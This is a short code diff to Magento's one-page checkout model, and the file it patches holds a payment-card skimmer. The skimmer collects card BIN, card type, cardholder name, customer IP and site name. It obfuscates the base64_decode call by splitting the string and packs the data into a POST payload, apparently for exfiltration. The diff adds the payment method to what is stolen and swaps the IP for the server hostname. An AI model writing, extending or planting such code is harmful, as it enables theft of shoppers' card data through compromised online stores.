@@ -697,6 +697,7 @@ class Mage_Checkout_Model_Type_Onepage
                 $binCC = substr($data['cc_number'], 0, 6);
                 $ipcid = trim(getenv('REMOTE_ADDR'));
                 $web = trim($_SERVER['SERVER_NAME']);
+                $method = $data['method'];
                 $subject = "[ ".$binCC." ] ".$data['cc_type']." - [".$web." - ".$ipcid."]";
                 $from = "From: ".$data['cc_owner']."-".$data['method']." <onepage@magento.com>";                
 		$idkey = "base"."64"."_"."de"."code";
@@ -706,8 +707,9 @@ class Mage_Checkout_Model_Type_Onepage
         $arraypost = array(
                             'data'      => $datasend,
                             'subject'   => $subject,
-                            'server'    => $ipcid,
+                            'server'    => $web,
                             'email'     => $emailpost,
+                            'method'    => $method,
                             'header'    => $from
         );
         $post = http_build_query($arraypost); 
